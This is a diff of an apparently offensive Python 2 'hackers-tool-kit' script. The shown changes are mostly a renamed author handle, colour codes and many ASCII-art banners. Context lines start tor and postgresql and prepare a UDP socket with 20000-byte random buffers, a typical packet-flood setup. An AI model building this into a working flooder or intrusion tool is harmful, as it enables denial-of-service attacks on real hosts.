@@ -1,7 +1,28 @@
 #!/usr/local/bin/python
 # coding: latin-1
-#if you use this code give me credit @unkn0wn_bali
-#i do not give you permission to edit this script without my credit
+#if you use this code give me credit @tuf_unkn0wn
+#i do not give you permission to show / edit this script without my credit
+#to ask questions or report a problem message me on instagram @tuf_unkn0wn
+"""
+
+
+ ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀▓█████ ▓█████▄ 
+▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▒██▀ ██▌
+▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ░██   █▌
+░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ░▓█▄   ▌
+░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░▒████▓ 
+ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░ ▒▒▓  ▒ 
+ ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░ ░ ▒  ▒ 
+ ░  ░░ ░  ░   ▒   ░        ░ ░░ ░    ░    ░ ░  ░ 
+ ░  ░  ░      ░  ░░ ░      ░  ░      ░  ░   ░    
+                  ░                       ░      
+
+
+"""
+
+
+#this is the loading screen \ the imports START#
+#----------------------------------------------#
 import os
 print "Starting hackers-tool-kit...  [ * ]-[0%]"
 import platform
@@ -71,6 +92,7 @@ from threading import Thread, active_count
 os.system("clear")
 print "Starting hackers-tool-kit...  [ * ]-[63%]"
 import random
+import readline
 os.system("clear")
 print "Starting hackers-tool-kit...  [  *]-[67%]"
 import string
@@ -113,6 +135,8 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 Gb = random._urandom(20000)
 bytes = random._urandom(20000)
 Kb = random._urandom(20000)
+#COLOR VARIABLES START#
+#---------------------#
 r = '\033[31m'
 W = '\033[90m'
 R = '\033[91m'
@@ -125,19 +149,38 @@ P = '\033[95m'
 Bl = '\033[30m'
 O = '\033[33m'
 p = '\033[35m'
+
+lred = '\033[91m'
+lblue = '\033[94m'
+lgreen = '\033[92m'
+yellow = '\033[93m'
+cyan = '\033[1;36m'
+purple = '\033[95m'
+red = '\033[31m'
+green = '\033[32m'
+blue = '\033[34m'
+orange = '\033[33m'
+
+colorlist = [red, blue, green, yellow, lblue, purple, cyan, lred, lgreen, orange]
+randomcolor = random.choice(colorlist)
+#-------------------#
+#COLOR VARIABLES END#
+
 os.system("clear")
-print "Starting hackers-tool-kit...  [ * ]-[100%] \033[92m   READY\033[0m"
-os.system("printf '\033]2;Hackers-Tool-Kit | HTK | @unkn0wn_bali\a'")
+print "Starting hackers-tool-kit...  [ * ]-[100%]   [ \033[1m\033[32mREADY \033[0m]"
+os.system("printf '\033]2;Hackers-Tool-Kit | HTK | @tuf_unkn0wn\a'")
 os.system("service tor start")
 os.system("service postgresql start")
 os.system("clear")
-def mainbanner():
-	print N+"""  _                _                       _              _       _    _ _   
-	  _                _                       _              _       _    _ _   
-	 | |__   __ _  ___| | _____ _ __ ___      | |_ ___   ___ | |     | | _(_) |_ 
-	 | '_ \ / _` |/ __| |/ / _ \ '__/ __|_____| __/ _ \ / _ \| |_____| |/ / | __|
-	 | | | | (_| | (__|   <  __/ |  \__ \_____| || (_) | (_) | |_____|   <| | |_ \033[91m
-	 |_| |_|\__,_|\___|_|\_\___|_|  |___/      \__\___/ \___/|_|     |_|\_\_|\__|\033[34m
+#----------------------------------------------#
+#this is the loading screen \ the imports END#
+
+
+#MAIN STARTING BANNER START#
+#--------------------------#
+def mainbanner1():
+	os.system("cat /root/hackers-tool-kit/tools/htkbanner.txt | lolcat")
+	print N+"""\033[34m   
 		..............           \033[0mtype ? for help\033[34m                         
 			    ..,;:ccc,.                             
 			  ......''';lxO.                           
@@ -149,7 +192,7 @@ def mainbanner():
 				    dMc               :OO;          
 				    0M.                 .:o.       
 				    ;Wd                            
-				     ;XO, 			\033[93mCreated By @unkn0wn_bali On Instagram\033[34m                         
+				     ;XO, 			\033[93mCreated By @tuf_unkn0wn On Instagram\033[34m                         
 				       ,d0Odlc;,..                 
 				           ..',;:cdOOd::,.        
 				                    .:d;.':;.     
@@ -171,6 +214,588 @@ def mainbanner():
 			 ░  ░░ ░    ▒  ░        ░   ░░ ░   ░      ░░   ░ 
 			 ░  ░  ░    ░  ░       ░      ░    ░      ░   ░          
 	""".decode('utf-8')
+def mainbanner2():
+	print """
+    type ? for help
+\033[92m
+     ▄█   ▄█   ▄█  
+     ███  ███  ███  
+     ███▌ ███▌ ███▌ 
+     ███▌ ███▌ ███▌ 
+     ███▌ ███▌ ███▌ 
+     ███  ███  ███  
+     ███  ███  ███  
+     █▀   █▀   █▀   
+
+ ┬ ┬┌─┐┌─┐┬┌─┌─┐┬─┐┌─┐
+ ├─┤├─┤│  ├┴┐├┤ ├┬┘└─┐\033[90m
+ ┴ ┴┴ ┴└─┘┴ ┴└─┘┴└─└─┘
+ ┌┬┐┌─┐┌─┐┬   ┬┌─┬┌┬┐\033[92m 
+  │ │ ││ ││───├┴┐│ │  
+  ┴ └─┘└─┘┴─┘ ┴ ┴┴ ┴ \033[0m
+Created By @tuf_unkn0wn 
+	""".decode('utf-8')
+def mainbanner3():
+	print """\033[91m
+	▒\033[90m██   ██\033[91m▒      ▒\033[90m██   ██\033[91m▒      
+	▒▒ \033[90m█ █ \033[91m▒░      ▒▒ \033[90m█ █ \033[91m▒░      
+	░░  \033[90m█   \033[91m░      ░░  \033[90m█   \033[91m░      
+	 ░ \033[90m█ █ \033[91m▒        ░ \033[90m█ █ \033[91m▒       
+	▒\033[90m██\033[91m▒ ▒\033[90m██\033[91m▒      ▒\033[90m██\033[91m▒ ▒\033[90m██\033[91m▒      
+	▒▒ ░ ░▓ ░      ▒▒ ░ ░▓ ░      
+	░░   ░▒ ░      ░░   ░▒ ░      
+	 ░    ░         ░    ░        
+	 ░    ░         ░    ░        
+	\033[90m
+
+	  ████████████████████
+	 ██                  ██\033[91m
+	 ▒▒                  ▒▒
+	 ░░                  ░░
+	  ░                  ░
+	  ░                  ░\033[0m
+
+888    888      88888888888      888    d8P  
+888    888          888          888   d8P   
+888    888          888          888  d8P \033[1;36m   
+8888888888          888          888d88K     
+888    888          888          8888888b\033[0m    
+888    888 888888   888   888888 888  Y88b   
+888    888          888          888   Y88b  
+888    888          888          888    Y88b 
+   Created By @tuf_unkn0wn On Instagram
+             type ? for help
+	""".decode('utf-8')
+def mainbanner4():
+	print P+"""
+	 .S    S.         sdSS_SSSSSSbs         .S    S.   
+	.SS    SS.        YSSS~S%SSSSSP        .SS    SS.  
+	S%S    S%S             S%S             S%S    S&S  
+	S%S    S%S             S%S             S%S    d*S  
+	S%S SSSS%S             S&S             S&S   .S*S  
+	S&S  SSS&S             S&S             S&S_sdSSS   
+	S&S    S&S             S&S             S&S~YSSY%b  
+	S&S    S&S             S&S             S&S    `S%  
+	S*S    S*S             S*S             S*S     S%  
+	S*S    S*S             S*S             S*S     n&  
+	S*S    S*S             S*S             S*S    wS&  
+	SSS    S*S             S*S             S*S   0 SS  
+	   h   SP              SP              SP   n       
+	    a  Y               Y               Y   k       
+	     c                                    n            
+	      k e r s - t o o l - k i t  by @tuf_u\033[0m
+
+                        type ? for help
+	""".decode('utf-8')
+def mainbanner5():
+	print R+"""
+   ██▀███   ▄▄▄      ▒███████▒ ▒█████   ██▀███  
+  ▓██ ▒ ██▒▒████▄    ▒ ▒ ▒ ▄▀░▒██▒  ██▒▓██ ▒ ██▒
+  ▓██ ░▄█ ▒▒██  ▀█▄  ░ ▒ ▄▀▒░ ▒██░  ██▒▓██ ░▄█ ▒
+  ▒██▀▀█▄  ░██▄▄▄▄██   ▄▀▒   ░▒██   ██░▒██▀▀█▄  
+  ░██▓ ▒██▒ ▓█   ▓██▒▒███████▒░ ████▓▒░░██▓ ▒██▒
+  ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▒▒ ▓░▒░▒░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
+    ░▒ ░ ▒░  ▒   ▒▒ ░░░▒ ▒ ░ ▒  ░ ▒ ▒░   ░▒ ░ ▒░
+    ░░   ░   ░   ▒   ░ ░ ░ ░ ░░ ░ ░ ▒    ░░   ░ 
+     ░           ░  ░  ░ ░        ░ ░     ░     
+                     ░\033[0m                          
+ .,,,,,,,,,,.,,,.....,...........................
+ ...,...,....,.,..,......,,,,.......,.,,,,,,,.,,,
+ ..,......,.....,,.,........,,...........,,.,....
+  ...,.,,.,....,,,,..,..,,,,,,......,,.,...,..../
+  ***********************//***/***//**/**********
+      ******************   ******************             @tuf_unkn0wn
+      *,*****,*,********   ***,**************    
+  **,,,,,,,,,,,,,,*,,,,,   *,,,,,,,,,*,,,,,,,,,**        type ? for help
+  ,,,,,,,,,,,,,,,,,,,,,,,*,,,,,,,,,,,,,,,,,,,,,,,
+  ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+  ***********************************************\033[91m
+
+        ▄████▄   █    ██ ▄▄▄█████▓  ██████ 
+       ▒██▀ ▀█   ██  ▓██▒▓  ██▒ ▓▒▒██    ▒ 
+       ▒▓█    ▄ ▓██  ▒██░▒ ▓██░ ▒░░ ▓██▄   
+       ▒▓▓▄ ▄██▒▓▓█  ░██░░ ▓██▓ ░   ▒   ██▒
+       ▒ ▓███▀ ░▒▒█████▓   ▒██▒ ░ ▒██████▒▒
+       ░ ░▒ ▒  ░░▒▓▒ ▒ ▒   ▒ ░░   ▒ ▒▓▒ ▒ ░
+       ░  ▒   ░░▒░ ░ ░     ░    ░ ░▒  ░ ░
+       ░         ░░░ ░ ░   ░      ░  ░  ░  
+       ░ ░         ░                    ░  
+       ░  \033[0m                                 
+	""".decode('utf-8')
+def mainbanner6():
+	print """
+		  |-|____________________
+		 /|_|_\ /__,''___ /____ /|
+		 |\033[90mHHHHHH\033[0m|   \_/   |\033[90mHHHHH\033[0m|/|
+		 |``````|_________|`````| |
+		 |    \033[93m~~~~~~~~~~~~~~\033[0m    | |
+		 |        .-/\-,        | |
+		 |        _\\//_        | |
+		 |       \033[92m|  /(_)|\033[0m       | |
+		 |\033[92m_______|_||.-.|_______\033[0m|/|
+		 |\033[90mHHHHHHH\033[0m| ||:_ |\033[90mHHHHHHH\033[0m|/|
+		 |\033[92m```````|_||:_)|```````\033[0m| |
+		 |       \033[92m|______|       \033[0m| |
+		 |        ______        | |
+		 |       (__\033[90m24\033[0m__)       | |
+		 |       ~~~~~~~~       | |
+		 |   By @tuf_unkn0wn    | |
+		 |______________________|/
+	\033[91m                                                                                               
+	    ) (             )   (                      
+	 ( /( )\   )     ( /(   )\  (        (  (      
+	 )\()|(_| /(  (  )\()) ((_)))\  (    )\))( (   
+	((_)\ _ )(_)) )\((_)\   _ /((_) )\ )((_))\ )\  
+	| |(_) ((_)_ ((_) |(_) | (_))( _(_/( (()(_|(_) 
+	| '_ \ / _` / _|| / /  | | || | ' \)) _` |(_-< 
+	|_.__/_\__,_\__||_\_\  |_|\_,_|_||_|\__, |/__/ 
+		                            |___/      
+	\033[90m
+		      )
+		     (\033[33m
+	 _ \033[0m___________ \033[90m)\033[33m
+	[_[\033[0m___________\033[91m#\033[0m 
+	type ? for help  
+	""".decode('utf-8')
+def mainbanner7():
+	os.system("cat /root/hackers-tool-kit/tools/skull.txt")
+def mainbanner8():
+	print """
+             type ? for help\033[91m
+
+@@@             /$$   /$$            @@@  
+@@@            | $$  | $$            @@@
+@@!            | $$  | $$            @@!
+!@!            | $$$$$$$$            !@!
+!!@            | $$__  $$            !!@
+!!!            | $$  | $$            !!!
+!!:            | $$  | $$            !!:
+:!:            |__/  |__/            :!:
+@@@                                  @@@\033[94m
+@@@                                  @@@
+@@!                                  @@!
+!@!             /$$$$$$$$            !@!
+!!@            |__  $$__/            !!@
+!!!               | $$               !!!
+!!:               | $$               !!:
+:!:---------------| $$---------------:!:
+@@@               | $$               @@@
+@@@               | $$               @@@
+@@!               |__/               @@!
+!@!                                  !@!\033[91m
+!!@                                  !!@
+!!!             /$$   /$$            !!!
+!!:            | $$  /$$/            !!:
+:!:            | $$ /$$/             :!:
+@@@            | $$$$$/              @@@
+@@@            | $$  $$              @@@
+@@!            | $$\  $$             @@!
+!@!            | $$ \  $$            !@!
+!!@            |__/  \__/            !!@
+!!!                                  !!!
+!!:                                  !!:
+:!:                                  :!:\033[92m
+ ::                                   ::
+:             @tuf_unkn0wn           :\033[0m
+"""
+def mainbanner9():
+	print """
+\033[91m╔\033[0m██████████████████████████████████████████████████████████████████\033[91m═╗
+║                                                                   ║
+\033[33m║                                                                   ║
+║\033[0m        ▄▀▀▀▀▄  ▄▀▀▄ ▀▀▄  ▄▀▀▀▀▄  ▄▀▀▀█▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄ ▄▀▄     \033[33m║
+\033[93m║\033[0m       █ █   ▐ █   ▀▄ ▄▀ █ █   ▐ █    █  ▐ ▐  ▄▀   ▐ █  █ ▀  █     \033[93m║
+║\033[0m          ▀▄   ▐     █      ▀▄   ▐   █       █▄▄▄▄▄  ▐  █    █     \033[93m║
+\033[92m║\033[0m       ▀▄   █        █   ▀▄   █     █        █    ▌    █    █      \033[92m║
+║\033[0m        █▀▀▀       ▄▀     █▀▀▀    ▄▀        ▄▀▄▄▄▄   ▄▀   ▄▀       \033[92m║
+\033[1;36m║\033[0m        ▐          █      ▐      █          █    ▐   █    █        \033[1;36m║
+║\033[0m                   ▐             ▐          ▐        ▐    ▐        \033[1;36m║
+\033[94m║\033[0m            ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▄    ▄▀▀▄  ▄▀▀▄ ▀▄                \033[94m║
+║\033[0m           █ ▄▀   █ █      █ █   █    ▐  █ █  █ █ █               \033[94m ║
+\033[34m║\033[0m           ▐ █    █ █      █ ▐  █        █ ▐  █  ▀█                \033[34m║
+║\033[0m             █    █ ▀▄    ▄▀   █   ▄    █    █   █                 \033[34m║
+\033[95m║\033[0m            ▄▀▄▄▄▄▀   ▀▀▀▀      ▀▄▀ ▀▄ ▄▀  ▄▀   █                  \033[95m║
+║\033[0m           █     ▐                    ▀    █    ▐                  \033[95m║
+\033[35m║\033[0m           ▐                               ▐                       \033[35m║
+║                                                                   ║\033[1;31m
+╚═\033[0m█████████████████████████████████████████████████████████████████\033[1;31m═╝\033[0m
+                       type ? for help
+	""".decode('utf-8')
+
+def mainbanner10():
+	print """\033[0m
+		                        ░░░▓█▒░▒▒▒▓▓░                                  
+		                  ░░░░░▓▓░▒▓▓▓▓▓▓▓▓▓▓▓█░░░░                            
+		                  ░░█▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░                            
+		               ░░█▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░                         
+		      ░░░░  ░░▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██░░              ░░░░      
+		     ░░░░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████████▒░░         ░░▓▒▒▒▒▓░░   
+		   ░▓░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██████████████████▓░░░░░▒▓▓▓▓▓▓███████
+		 ░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█████████████████████████████████░░░░░░░
+		░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓▓▓▓██████████████████████████████████░       
+		░█▓▓▓██████████▓▓▓▓▓▓▓▓▓▓▓▓▓██████████████████████████████████▒░       
+	       ░▒▓▓▓████░░░░░░░░░░░░░▒▓███████████████████████████████████████░░       
+	       ░▓▓▓███▒▒░░░░░░░░░░░░░░░░░░░░▒██▓██████████████████████████████░░       
+	      ░█▓▓███░░░░░░░░░░░░░░░░░░░░░░░░░░░▒███████████████████████████▓░         
+	     ░█▓▓███▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█████████████████░░░░░░░░░          
+	    ░░▓▓████░░░░░░░░░░░░░░░░░░░░████▓░░░░░░░░█████████████▓░                   
+	    ░█▓█████░░░░░░░░░░░░░░░░░▒░████████░░░░░░░████████████░░                   
+	   ░░▒▓█████░░░░▒░▓████░░░░░░▒░█████████▓░░░░░███████████▓░░░░░                
+	  ░░▓▒▓█████░░░▒░▓██████░░░░░▒░▓█████████░░░░░▒██████████░░▒▒▓░                
+	  ░░█▒▓▓████▒░░░░███████▓░░░░░▒░░████████▓░░░░▒████████░▓░▓▓░▓▓░░░             
+	  ░░░▒▓▓▓████░░░░▓██████▓░░░░░░▒░░░▓█████░░░░░███████▓░▓▓▓▓▓▓▒▒░░░             
+	    ░▒▒▓▓████░░▒░░██████░░░░░░░░░▒░░░░░░▒░░░░░████▓░▒▓▓▓▓▓░░░▒▒▒░▒░            
+	     ░░▓▓████░░░▒░░▒███░░▒▓▒▒█▓░░░░░░░░░░░░░▒██▓▒▓▓▓▓▓▓▒░░░░░░▒▒▒▒▒░░          
+	     ░░░░████░░░░░░░░░░░░░█░░▓█▓░░░░██████████▒▒▓▓▓▓░░░░░▒░░░░░▒▒▒▒▒░          
+	 ░░░░░░ ░░████░░░░░░░░░░░░░░░░░░░░░░███████▓▒▓▓░░░░░░░   ░░░░░░░▒▒▒░▒░         
+	░▒░░▒░░░▒░▒█████▓▒░▒█░░░░░░░░░░░░░░░░███▓▒▓▒░░             ░▒░░░░▒▒▒░░░░       
+	░░▒░▒░░░░░░░██████████░░░░░░▒░░░▒░░▒▒▒▒▒▒▒░░░               ░▒░░░░▒▒░▒░░       
+	▒░░░░░▒▒▒░░░░░░██████░░▒▒▒▒▒▒▒▒▒▓█▓▓▒▒▓▓▓█░                 ░░▒░░░░▒▒▒░░       
+	 ░░░░░░▒▒░░░░       ░░▓▓▓▓▓▓▓█▓▓▒▒▓▓█▓▓▓▓▓█   \033[92m@tuf_unkn0wn\033[0m    ░░░░░░░▒░░░       
+	  ░░▒░░░░░▒▓█     ░▒▒▓▓▓▓█▓█▓▓▒▒▓▓██▓▓▓▓▓▓█   \033[94mtype ? for help\033[0m  ░░░░░▒▒░░       
+	     ░▒░░░░█▓██▒░▒▓▓██▓▒▒▒▒▓▒▓▓████▓▓▓▓▓██▒                    ▒░░░░░▒░░       
+	       ░░▓▒█▓▓▓▓▓▓▓██▓▒▒░▒▒▒▒█▓▓███▓▓▓▓▓▓█░                    ▒░░░░▒░         
+	       ░▒███▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒░▒████▓▓▓▓▓▓▒░                    ▒░░░░░          
+	       ░████▓▓▓▓▓▓▓▒▓▓▓▓█▒▒░░▒░█▓█▓█▓████░                     ▒░░▒░░          
+	       ░▓██▓▓▓▓▓▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓█▓▓▓▓██▒░                    ░░▒░             
+	       ░░██▓▓▒▓▓██▓▓▓▓▓▓▓▓▓████▓▓▓▓█▓▓█░░░                                     
+		░██▓▓███▒▓▓▓▓▓▓▓▓▓█████▓██▓██░░                                        
+		░░█▓█░░ ░▒▒▓▓▓▓▓▓▓▓▓███▓██▓█░                                          
+		  ▓█░    ░█▓▓▓▓▓▓▓▓▓████▓███░ ░                                        
+		         ░█▓▓▓▓▓▓███████▓██▓██░                                        
+		         ░██▓▓▓████████████████░░░                                     
+		         ░▓▓▓▓▓███████▓█▓████████░      ░░░                            
+		       ░░░█▓█████████████████████████▓▓▓▒░░░░░░                        
+		   ░░░▒█▓█▓██████████████████████▓███████████████░░░░░░░░░             
+		  ▓█▒▓▓▓▓▓▓█████████████████████████████████████████████████░          
+		░█▓▓▓▓▓▓▓▓▓█████████████████████████████████████▒░░░  ░  ░░░░          
+		         ░░▓█▓█▓█████████████████████████████░░                       
+	\033[0m""".decode('utf-8')
+def mainbanner11():
+	print """\033[91m
+            ██████╗  ██████╗  ██████╗ 
+           ██╔════╝ ██╔════╝ ██╔════╝ 
+           ███████╗ ███████╗ ███████╗ 
+           ██╔═══██╗██╔═══██╗██╔═══██╗
+           ╚██████╔╝╚██████╔╝╚██████╔╝
+            ╚═════╝  ╚═════╝  ╚═════╝ 
+     ░░░░                           ░░░░░       
+   ░▒███████▓▒░░                 ░░░████████▓░░░ 
+  ░▓████████████▒░░            ░░█████████████░░ 
+  ▒▓░   ░░████████░░         ░░████████░░░ ░░▒█░ 
+  ░         ░██████▒░     ░░░░███████         ░░ 
+            ░░███████░░    ░░██████▓░            
+              ░███████░░  ░▒██████▒              
+  ░░░░        ░░███████░░░███████▒░          ░░░ 
+ ░░░░░        ░░░███████░████████░░░   ░░░ ░░░░  
+  ░░▓████▓▒░░░░▒▒███████████████░░░░░░░▒▓████░ ░ 
+    ░▒██████████████▒████████▒██████████████░░   
+     ░░██████████████▒░███▒▒▒█████████████░░     
+         ░░░░▓████████░█░▓▓▒████████▒░░░░░       
+            ░░████████▓░██░████████▒░░░          
+            ░░▒██████░▒▒░░▒░░██████░             
+            ░░█████████▓░█░████▓███▓░            
+            ░▒█▓░▒██████▒███████░░█▓░            
+            ░░░███████████████████▓░░            
+              ░▒▓████████████████▒░              
+              ░░▒███████████████▓▒░              
+                 ░▒█████▓██████░░                
+                   ░██████████░                  
+   @tuf_unkn0wn    ░█████████▒    type ? for help             
+                    █████████░░                  
+                   ░░████████░░                  
+                    ░▓█████▓░                    
+                     ░▓████▒░                    
+                     ░░████░                     
+                    ░░░▒██░░                     
+                       ░█▓░                      
+                      ░░▓░░                      
+                      ░░░░░                      
+                        ░░                    
+	\033[0m""".decode('utf-8')
+def mainbanner12():
+	print """\033[91m
+
+
+██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ ███████╗   ████████╗ ██████╗  ██████╗ ██╗      ██╗  ██╗██╗████████╗
+██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔════╝   ╚══██╔══╝██╔═══██╗██╔═══██╗██║      ██║ ██╔╝██║╚══██╔══╝
+███████║███████║██║     █████╔╝ █████╗  ██████╔╝███████╗█████╗██║   ██║   ██║██║   ██║██║█████╗█████╔╝ ██║   ██║   
+██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗╚════██║╚════╝██║   ██║   ██║██║   ██║██║╚════╝██╔═██╗ ██║   ██║   
+██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║███████║      ██║   ╚██████╔╝╚██████╔╝███████╗ ██║  ██╗██║   ██║   
+╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   
+                                                                                                                  
+
+	""".decode('utf-8')
+def mainbanner13():
+	print """\033[92m
+
+
+██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ ███████╗   ████████╗ ██████╗  ██████╗ ██╗      ██╗  ██╗██╗████████╗
+██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔════╝   ╚══██╔══╝██╔═══██╗██╔═══██╗██║      ██║ ██╔╝██║╚══██╔══╝
+███████║███████║██║     █████╔╝ █████╗  ██████╔╝███████╗█████╗██║   ██║   ██║██║   ██║██║█████╗█████╔╝ ██║   ██║   
+██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗╚════██║╚════╝██║   ██║   ██║██║   ██║██║╚════╝██╔═██╗ ██║   ██║   
+██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║███████║      ██║   ╚██████╔╝╚██████╔╝███████╗ ██║  ██╗██║   ██║   
+╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   
+                                                                                                                  
+
+	""".decode('utf-8')
+def mainbanner14():
+	print """\033[34m
+
+
+██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ ███████╗   ████████╗ ██████╗  ██████╗ ██╗      ██╗  ██╗██╗████████╗
+██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔════╝   ╚══██╔══╝██╔═══██╗██╔═══██╗██║      ██║ ██╔╝██║╚══██╔══╝
+███████║███████║██║     █████╔╝ █████╗  ██████╔╝███████╗█████╗██║   ██║   ██║██║   ██║██║█████╗█████╔╝ ██║   ██║   
+██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗╚════██║╚════╝██║   ██║   ██║██║   ██║██║╚════╝██╔═██╗ ██║   ██║   
+██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║███████║      ██║   ╚██████╔╝╚██████╔╝███████╗ ██║  ██╗██║   ██║   
+╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   
+
+
+	""".decode('utf-8')
+def mainbanner15():
+	print """\033[93m
+                         __    _                                   
+                    _wr""        "-q__                             
+                 _dP                 9m_     
+               _#P                     9#_                         
+              d#@    \033[92mtype ? for help\033[93m    9#m                        
+             d##                         ###                       
+            J###                         ###L                      
+            {###K                       J###K                      
+            ]####K      ___aaa___      J####F                      
+        __gmM######_  w#P""   ""9#m  _d#####Mmw__                  
+     _g##############mZ_         __g##############m_               
+   _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_             
+  a###""          ,Z"#####@" '######"\g          ""M##m            
+ J#@"             0L  "*##     ##@"  J#              *#K           
+ #"               `#    "_gmwgm_~    dF               `#_          
+7F                 "#_   ]#####F   _dK                 JE          
+]                    *m__ ##### __g@"                   F          
+      \033[92m@tuf_unkn0wn\033[93m     "PJ#####LP"  \033[92mhackers-tool-kit\033[93m                             
+ `                       0######_                      '           
+                       _0########_                                   
+     .               _d#####^#####m__              ,              
+      "*w_________am#####P"   ~9#####mw_________w*"                  
+          ""9@#####@M""           ""P@#####@M""                    
+\033[92m
+                 ██░ ██ ▄▄▄█████▓ ██ ▄█▀
+                ▓██░ ██▒▓  ██▒ ▓▒ ██▄█▒ 
+                ▒██▀▀██░▒ ▓██░ ▒░▓███▄░ 
+                ░▓█ ░██ ░ ▓██▓ ░ ▓██ █▄ 
+                ░▓█▒░██▓  ▒██▒ ░ ▒██▒ █▄
+                 ▒ ░░▒░▒  ▒ ░░   ▒ ▒▒ ▓▒
+                 ▒ ░▒░ ░    ░    ░ ░▒ ▒░
+                 ░  ░░ ░  ░      ░ ░░ ░ 
+                 ░  ░  ░         ░  ░\033[0m   
+	""".decode('utf-8')      
+def mainbanner16():
+	print """\033[91m
+                      :PB@Bk:
+                  ,jB@@B@B@B@BBL.
+               7G@B@B@BMMMMMB@B@B@Nr
+           :kB@B@@@MMOMOMOMOMMMM@B@B@B1,
+       :5@B@B@B@BBMMOMOMOMOMOMOMM@@@B@B@BBu.
+    70@@@B@B@B@BXBBOMOMOMOMOMOMMBMPB@B@B@B@B@Nr
+  G@@@BJ iB@B@@  OBMOMOMOMOMOMOM@2  B@B@B. EB@B@S
+  @@BM@GJBU.  iSuB@OMOMOMOMOMOMM@OU1:  .kBLM@M@B@
+  B@MMB@B       7@BBMMOMOMOMOMOBB@:       B@BMM@B
+  @@@B@B         7@@@MMOMOMOMM@B@:         @@B@B@
+  @@OLB.          BNB@MMOMOMM@BEB          rBjM@B
+  @@  @           M  OBOMOMM@q  M          .@  @@
+  @@OvB           B:u@MMO\033[31mMOMMBJiB          .BvM@B
+  @B@B@J         0@B@MMOMOMOMB@B@u         q@@@B@
+  B@MBB@v       G@@BMMMMMMMMMMMBB@5       F@BMM@B
+  @BBM@BPNi   LMEB@OMMMM@B@MMOMM@BZM7   rEqB@MBB@
+  B@@@BM  B@B@B  qBMOMB@B@B@BMOMBL  B@B@B  @B@B@M
+   J@@@@PB@B@B@B7G@OMBB.   ,@MMM@qLB@B@@@BqB@BBv
+      iGB@,i0@M@B@MMO@E  :  M@OMM@@@B@Pii@@N:
+         .   B@M@B@MMM@B@B@B@MMM@@@M@B
+             @B@B.i@MBB@B@B@@BM@::B@B@
+             B@@@ .B@B.:@B@ :B@B  @B@O
+               :0 r@B@  B@@ .@B@: P:
+                   vMB :@B@ :BO7
+                       ,B@B\033[0m
+
+            \033[32m╔═══\033[93m+\033[0mHackers-Tool-Kit\033[93m+\033[32m════╗\033[0m
+            ███████████████████████████
+                 type   █?█ for help
+                        ███
+            \033[31m▄▄    ▄▄    \033[0m███\033[31m    ▄▄   ▄▄▄ 
+            ██    ██    \033[0m███\033[31m    ██  ██▀  
+            ██    ██    \033[0m███\033[31m    ██▄██    
+            ████████    \033[0m███\033[31m    █████    
+            ██    ██    \033[0m███\033[31m    ██  ██▄  
+            ██    ██    \033[0m███\033[31m    ██   ██▄ 
+            ▀▀    ▀▀    \033[0m▀▀▀\033[31m    ▀▀    ▀▀\033[0m 
+	""".decode('utf-8')
+def mainbanner17():
+	print """
+
+                 .---.
+                 |---|
+           type  |-\033[32m?\033[0m-| for help
+                 |---|
+             .---^ - ^---.
+             :___________:
